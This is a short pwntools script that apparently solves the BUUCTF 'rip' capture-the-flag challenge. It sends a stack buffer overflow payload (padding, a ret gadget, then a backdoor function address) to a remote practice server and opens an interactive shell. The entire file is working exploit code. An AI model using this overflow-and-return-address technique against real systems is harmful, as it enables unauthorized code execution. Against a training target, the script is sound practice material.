from pwn import *
from LibcSearcher import *

# BUUCTF-rip
context(log_level = 'debug', arch = 'amd64', os = 'linux')
p = remote('node5.buuoj.cn', 27242)
#p=process('./pwn1')
#p=gdb.debug('./pwn1','b main')
#elf = ELF('./memory')
#libc=ELF('./libc-2.23.so')

backdoor = 0x401186
ret_addr = 0x401016

payload = b'a' * (0xf + 0x8) + p64(ret_addr) + p64(backdoor)
p.sendline(payload)
p.interactive() 
